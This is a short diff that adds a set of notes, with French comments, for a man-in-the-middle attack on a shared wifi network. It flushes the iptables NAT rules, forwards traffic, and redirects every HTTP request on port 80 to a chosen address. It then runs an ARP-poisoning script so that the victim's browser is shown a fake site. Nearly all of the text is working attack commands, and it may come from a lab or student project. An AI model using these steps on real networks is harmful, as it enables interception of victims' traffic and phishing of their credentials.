@@ -1,0 +1,10 @@
+PREPARATION OF DISPLAYING FAKE SITE ON VICTIM BROWSER
+iptables -t nat --flush
+iptables --zero
+iptables -A FORWARD --in-interface eth0 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination 192.168.0.19
+
+python arp_poisoning.py
+
+eth0 correspond à l'interface sur l'ordinateur de l'attaquant
+192.168.0.19 correspond à l'adresse du routeur wifi commun à l'attaquant et la victime
